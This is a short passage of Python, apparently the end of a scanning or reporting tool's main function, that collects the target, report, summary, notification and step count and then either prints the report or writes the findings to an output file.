    extra = {"target": base_url, "report": report, "summary": summary, "notification": notif, "steps": step + 1}
    if getattr(args, "table", False) and not args.output:
        sys.stdout.write(report + "\n")
    else:
        output_result(findings, args.output, extra=extra)
    return 0
